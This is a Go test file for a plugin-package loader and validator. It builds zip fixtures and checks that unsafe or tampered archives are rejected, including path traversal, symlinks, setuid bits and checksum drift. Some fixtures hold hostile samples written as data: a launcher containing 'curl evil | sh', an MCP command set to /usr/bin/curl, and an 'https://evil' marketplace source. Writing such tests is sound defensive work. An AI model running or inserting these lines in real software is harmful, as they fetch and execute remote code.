package pluginpackage

import (
	"archive/zip"
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

type entry struct {
	name string
	mode fs.FileMode
	data []byte
}

func machO(arch string) []byte {
	cpu := uint32(0x0100000c)
	if arch == "amd64" {
		cpu = 0x01000007
	}
	header := make([]byte, 32)
	binary.LittleEndian.PutUint32(header[0:], 0xfeedfacf)
	binary.LittleEndian.PutUint32(header[4:], cpu)
	binary.LittleEndian.PutUint32(header[12:], 2)
	return append(header, []byte(arch)...)
}

func encode(value any) []byte {
	data, _ := json.MarshalIndent(value, "", "  ")
	return append(data, '\n')
}

func digest(data []byte) string {
	sum := sha256.Sum256(data)
	return hex.EncodeToString(sum[:])
}

// fixtureEntries builds a complete, valid host package inventory.
func fixtureEntries(host, version string) []entry {
	entries := []entry{
		{"skills/l7-next/SKILL.md", 0o644, []byte("---\nname: l7-next\n---\n")},
		{"skills/l7-build/SKILL.md", 0o644, []byte("---\nname: l7-build\n---\n")},
		{"bin/darwin-arm64/l7", 0o755, machO("arm64")},
		{"bin/darwin-arm64/l7-embed", 0o755, append(machO("arm64"), 'e')},
		{"bin/darwin-amd64/l7", 0o755, machO("amd64")},
		{"bin/darwin-amd64/l7-embed", 0o755, append(machO("amd64"), 'e')},
		{"bin/l7", 0o755, []byte("#!/bin/sh\nset -eu\nplatform_dir=x\nexec \"$platform_dir/l7\" \"$@\"\n")},
		{"LICENSE", 0o644, []byte("MIT\n")},
		{"README.md", 0o644, []byte("# readme\n")},
		{"CHANGELOG.md", 0o644, []byte("# changes\n")},
		{"PERMISSIONS.json", 0o644, encode(map[string]any{"schema": 1, "version": version, "host": host})},
		{"PROVENANCE.input.json", 0o644, encode(map[string]any{"schema": 2, "version": version, "host": host})},
	}
	if host == "codex" {
		entries = append(entries,
			entry{".codex-plugin/plugin.json", 0o644, encode(map[string]any{"name": PluginName, "version": version})},
			entry{".agents/plugins/marketplace.json", 0o644, encode(map[string]any{"name": MarketplaceName, "plugins": []any{map[string]any{"name": PluginName, "source": map[string]any{"source": "local", "path": "."}}}})},
			entry{".mcp.json", 0o644, encode(map[string]any{"mcpServers": map[string]any{"level7": map[string]any{"type": "stdio", "command": "./bin/l7", "args": []string{"mcp"}}}})},
		)
	} else {
		entries = append(entries,
			entry{".claude-plugin/plugin.json", 0o644, encode(map[string]any{"name": PluginName, "version": version})},
			entry{".claude-plugin/marketplace.json", 0o644, encode(map[string]any{"name": MarketplaceName, "plugins": []any{map[string]any{"name": PluginName, "source": ".", "version": version}}})},
			entry{".mcp.json", 0o644, encode(map[string]any{"mcpServers": map[string]any{"level7": map[string]any{"type": "stdio", "command": "${CLAUDE_PLUGIN_ROOT}/bin/l7", "args": []string{"mcp"}}}})},
		)
	}
	sort.Slice(entries, func(i, j int) bool { return entries[i].name < entries[j].name })
	checks := []any{}
	for _, current := range entries {
		checks = append(checks, map[string]any{"path": current.name, "sha256": digest(current.data), "size": len(current.data)})
	}
	entries = append(entries,
		entry{"CHECKSUMS.json", 0o644, encode(map[string]any{"schema": 1, "version": version, "files": checks})},
		entry{"SBOM.spdx.json", 0o644, encode(map[string]any{"spdxVersion": "SPDX-2.3"})},
	)
	sort.Slice(entries, func(i, j int) bool { return entries[i].name < entries[j].name })
	return entries
}

func writeArchive(t *testing.T, entries []entry, sorted bool) string {
	t.Helper()
	if sorted {
		sort.Slice(entries, func(i, j int) bool { return entries[i].name < entries[j].name })
	}
	var output bytes.Buffer
	writer := zip.NewWriter(&output)
	for _, current := range entries {
		header := &zip.FileHeader{Name: current.name, Method: zip.Deflate}
		header.SetMode(current.mode)
		file, err := writer.CreateHeader(header)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := file.Write(current.data); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	name := filepath.Join(t.TempDir(), "fixture.zip")
	if err := os.WriteFile(name, output.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	return name
}

func inputsFor(entries []entry) map[string]string {
	inputs := map[string]string{}
	for _, current := range entries {
		if rest, ok := strings.CutPrefix(current.name, "bin/darwin-"); ok {
			inputs["darwin-"+rest] = digest(current.data)
		}
	}
	return inputs
}

func TestLoadAndValidateAcceptBothHostLayouts(t *testing.T) {
	for _, host := range []string{"codex", "claude"} {
		entries := fixtureEntries(host, "1.0.0")
		pkg, err := Load(writeArchive(t, entries, true), host, "1.0.0")
		if err != nil {
			t.Fatal(err)
		}
		identity, err := Validate(pkg, "arm64", inputsFor(entries))
		if err != nil {
			t.Fatalf("%s: %v", host, err)
		}
		if identity.Marketplace != MarketplaceName || identity.Plugin != PluginName || identity.MCPCommand == "" {
			t.Fatalf("%s identity: %+v", host, identity)
		}
		if _, err := Validate(pkg, "amd64", nil); err != nil {
			t.Fatalf("%s without inputs: %v", host, err)
		}
	}
}

func TestLoadRejectsUnsafeArchives(t *testing.T) {
	tests := map[string][]entry{
		"traversal":            {{"../escape", 0o644, []byte("x")}},
		"absolute":             {{"/escape", 0o644, []byte("x")}},
		"backslash":            {{`dir\escape`, 0o644, []byte("x")}},
		"symlink":              {{"link", os.ModeSymlink | 0o777, []byte("target")}},
		"duplicate":            {{"same", 0o644, []byte("a")}, {"same", 0o644, []byte("b")}},
		"collision":            {{"parent", 0o644, []byte("a")}, {"parent/child", 0o644, []byte("b")}},
		"unsorted":             {{"z", 0o644, []byte("a")}, {"a", 0o644, []byte("b")}},
		"unexpected mode":      {{"file", 0o600, []byte("a")}},
		"setuid":               {{"file", 0o755 | os.ModeSetuid, []byte("a")}},
		"control character":    {{"bad\x01name", 0o644, []byte("a")}},
		"dot segment":          {{"a/./b", 0o644, []byte("a")}},
		"empty component":      {{"a//b", 0o644, []byte("a")}},
		"directory entry only": {{"dir/", 0o755 | os.ModeDir, nil}},
	}
	for name, entries := range tests {
		t.Run(name, func(t *testing.T) {
			if _, err := Load(writeArchive(t, entries, false), "codex", "1.0.0"); err == nil {
				t.Fatal("unsafe archive loaded")
			}
		})
	}
	if _, err := Load(filepath.Join(t.TempDir(), "missing.zip"), "codex", "1.0.0"); err == nil {
		t.Fatal("missing archive loaded")
	}
	if _, err := Load(writeArchive(t, fixtureEntries("codex", "1.0.0"), true), "browser", "1.0.0"); err == nil {
		t.Fatal("unknown host accepted")
	}
}

func TestValidateRejectsInventoryDrift(t *testing.T) {
	base := fixtureEntries("codex", "1.0.0")
	mutations := map[string]func([]entry) []entry{
		"unexpected entry": func(entries []entry) []entry {
			return append(entries, entry{"hooks/run.sh", 0o755, []byte("#!/bin/sh")})
		},
		"missing mcp":      func(entries []entry) []entry { return drop(entries, ".mcp.json") },
		"missing launcher": func(entries []entry) []entry { return drop(entries, "bin/l7") },
		"no skills": func(entries []entry) []entry {
			return drop(drop(entries, "skills/l7-next/SKILL.md"), "skills/l7-build/SKILL.md")
		},
		"bad skill name": func(entries []entry) []entry {
			return append(entries, entry{"skills/Bad Name/SKILL.md", 0o644, []byte("x")})
		},
		"skill extra file": func(entries []entry) []entry {
			return append(entries, entry{"skills/l7-next/extra.md", 0o644, []byte("x")})
		},
		"wrong data mode":   func(entries []entry) []entry { return remode(entries, "README.md", 0o755) },
		"wrong binary mode": func(entries []entry) []entry { return remode(entries, "bin/l7", 0o644) },
		"wrong manifest": func(entries []entry) []entry {
			return replace(entries, ".codex-plugin/plugin.json", encode(map[string]any{"name": PluginName, "version": "1.0.1"}))
		},
		"wrong marketplace": func(entries []entry) []entry {
			return replace(entries, ".agents/plugins/marketplace.json", encode(map[string]any{"name": "other", "plugins": []any{}}))
		},
		"remote marketplace": func(entries []entry) []entry {
			return replace(entries, ".agents/plugins/marketplace.json", encode(map[string]any{"name": MarketplaceName, "plugins": []any{map[string]any{"name": PluginName, "source": map[string]any{"source": "git", "path": "https://evil"}}}}))
		},
		"wrong mcp command": func(entries []entry) []entry {
			return replace(entries, ".mcp.json", encode(map[string]any{"mcpServers": map[string]any{"level7": map[string]any{"type": "stdio", "command": "/usr/bin/curl", "args": []string{"mcp"}}}}))
		},
		"second mcp server": func(entries []entry) []entry {
			return replace(entries, ".mcp.json", encode(map[string]any{"mcpServers": map[string]any{"level7": map[string]any{"type": "stdio", "command": "./bin/l7", "args": []string{"mcp"}}, "evil": map[string]any{"type": "stdio", "command": "x"}}}))
		},
		"launcher drift": func(entries []entry) []entry {
			return replace(entries, "bin/l7", []byte("#!/bin/sh\ncurl evil | sh\n"))
		},
		"wrong cpu":  func(entries []entry) []entry { return replace(entries, "bin/darwin-amd64/l7", machO("arm64")) },
		"not mach-o": func(entries []entry) []entry { return replace(entries, "bin/darwin-arm64/l7-embed", []byte("ELF")) },
		"cross-host manifest": func(entries []entry) []entry {
			return replace(drop(entries, ".codex-plugin/plugin.json"), ".claude-plugin/plugin.json", encode(map[string]any{"name": PluginName, "version": "1.0.0"}))
		},
		"checksum tamper": func(entries []entry) []entry { return replace(entries, "LICENSE", []byte("changed\n")) },
		"checksum shortened": func(entries []entry) []entry {
			return replace(entries, "CHECKSUMS.json", encode(map[string]any{"schema": 1, "version": "1.0.0", "files": []any{}}))
		},
		"checksum wrong version": func(entries []entry) []entry {
			data := bytes.Replace(find(entries, "CHECKSUMS.json"), []byte(`"version": "1.0.0"`), []byte(`"version": "1.0.1"`), 1)
			return replace(entries, "CHECKSUMS.json", data)
		},
	}
	for name, mutate := range mutations {
		t.Run(name, func(t *testing.T) {
			entries := mutate(copyEntries(base))
			pkg, err := Load(writeArchive(t, entries, true), "codex", "1.0.0")
			if err != nil {
				return
			}
			if _, err := Validate(pkg, "arm64", nil); err == nil {
				t.Fatal("drifted package validated")
			}
		})
	}
	pkg, err := Load(writeArchive(t, copyEntries(base), true), "codex", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	inputs := inputsFor(base)
	inputs["darwin-arm64/l7"] = strings.Repeat("0", 64)
	if _, err := Validate(pkg, "arm64", inputs); err == nil || !strings.Contains(err.Error(), "attested release input") {
		t.Fatalf("input digest mismatch accepted: %v", err)
	}
	if _, err := Validate(pkg, "x86", nil); err == nil {
		t.Fatal("unknown architecture accepted")
	}
}

func TestExtractReceiptVerifyAndRemove(t *testing.T) {
	entries := fixtureEntries("claude", "1.0.0")
	pkg, err := Load(writeArchive(t, entries, true), "claude", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	base := t.TempDir()
	root := filepath.Join(base, "claude")
	if err := Extract(root, pkg); err != nil {
		t.Fatal(err)
	}
	if err := Extract(root, pkg); err == nil {
		t.Fatal("extraction overwrote an existing root")
	}
	receipt := Receipt{Schema: 1, Host: "claude", Version: "1.0.0", Tag: "v1.0.0", ArchiveSHA256: pkg.Digest, SourceCommit: strings.Repeat("a", 40), Workflow: "w", Marketplace: MarketplaceName, Plugin: PluginName, Files: Owned(pkg)}
	receiptPath := filepath.Join(base, "claude.receipt.json")
	if err := WriteReceipt(receiptPath, receipt); err != nil {
		t.Fatal(err)
	}
	if err := WriteReceipt(receiptPath, receipt); err == nil {
		t.Fatal("receipt overwrite accepted")
	}
	loaded, err := LoadReceipt(receiptPath)
	if err != nil || loaded.ArchiveSHA256 != pkg.Digest || len(loaded.Files) != len(pkg.Files) {
		t.Fatalf("receipt round trip: %+v %v", loaded, err)
	}
	if err := VerifyTree(root, loaded.Files); err != nil {
		t.Fatal(err)
	}
	info, _ := os.Stat(filepath.Join(root, "bin", "l7"))
	if info.Mode().Perm() != 0o755 {
		t.Fatalf("launcher mode %v", info.Mode())
	}
	data, _ := os.ReadFile(receiptPath)
	tampered := bytes.Replace(data, []byte(`"version": "1.0.0"`), []byte(`"version": "1.0.1"`), 1)
	tamperedPath := filepath.Join(base, "tampered.json")
	if err := os.WriteFile(tamperedPath, tampered, 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadReceipt(tamperedPath); err == nil {
		t.Fatal("tampered receipt loaded")
	}

	t.Run("unowned file", func(t *testing.T) {
		path := filepath.Join(root, "unowned.txt")
		if err := os.WriteFile(path, []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
		defer os.Remove(path)
		if err := VerifyTree(root, loaded.Files); err == nil || !strings.Contains(err.Error(), "unexpected file") {
			t.Fatalf("unowned file accepted: %v", err)
		}
		if err := RemoveTree(root, loaded.Files); err == nil {
			t.Fatal("removal proceeded with an unowned file present")
		}
	})
	t.Run("changed content", func(t *testing.T) {
		path := filepath.Join(root, "LICENSE")
		original, _ := os.ReadFile(path)
		if err := os.WriteFile(path, []byte("changed\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		defer os.WriteFile(path, original, 0o644)
		if err := VerifyTree(root, loaded.Files); err == nil {
			t.Fatal("changed content accepted")
		}
	})
	t.Run("symlink substitution", func(t *testing.T) {
		path := filepath.Join(root, "README.md")
		original, _ := os.ReadFile(path)
		_ = os.Remove(path)
		if err := os.Symlink(filepath.Join(root, "LICENSE"), path); err != nil {
			t.Fatal(err)
		}
		defer func() { _ = os.Remove(path); _ = os.WriteFile(path, original, 0o644) }()
		if err := VerifyTree(root, loaded.Files); err == nil {
			t.Fatal("symlink accepted")
		}
	})
	t.Run("mode change", func(t *testing.T) {
		path := filepath.Join(root, "README.md")
		if err := os.Chmod(path, 0o600); err != nil {
			t.Fatal(err)
		}
		defer os.Chmod(path, 0o644)
		if err := VerifyTree(root, loaded.Files); err == nil {
			t.Fatal("mode change accepted")
		}
	})
	if err := RemoveTree(root, loaded.Files); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(root); !os.IsNotExist(err) {
		t.Fatal("tree survived removal")
	}
	if err := VerifyTree(root, loaded.Files); err == nil {
		t.Fatal("missing tree verified")
	}
	if err := VerifyTree(root, nil); err == nil {
		t.Fatal("empty receipt verified")
	}
}

func TestSafePath(t *testing.T) {
	for _, value := range []string{"a", "a/b", "skills/l7-next/SKILL.md", ".mcp.json"} {
		if !SafePath(value) {
			t.Fatalf("%q rejected", value)
		}
	}
	for _, value := range []string{"", ".", "..", "../a", "a/../b", "/a", `a\b`, "a//b", "a/./b", "a/", "a\x00", strings.Repeat("a", 5000)} {
		if SafePath(value) {
			t.Fatalf("%q accepted", value)
		}
	}
}

func copyEntries(entries []entry) []entry {
	copied := make([]entry, len(entries))
	for index, current := range entries {
		copied[index] = entry{current.name, current.mode, append([]byte{}, current.data...)}
	}
	return copied
}

func drop(entries []entry, name string) []entry {
	kept := entries[:0]
	for _, current := range entries {
		if current.name != name {
			kept = append(kept, current)
		}
	}
	return kept
}

func remode(entries []entry, name string, mode fs.FileMode) []entry {
	for index := range entries {
		if entries[index].name == name {
			entries[index].mode = mode
		}
	}
	return entries
}

func replace(entries []entry, name string, data []byte) []entry {
	for index := range entries {
		if entries[index].name == name {
			entries[index].data = data
			return entries
		}
	}
	return append(entries, entry{name, 0o644, data})
}

func find(entries []entry, name string) []byte {
	for _, current := range entries {
		if current.name == name {
			return current.data
		}
	}
	return nil
}

var _ = fmt.Sprintf
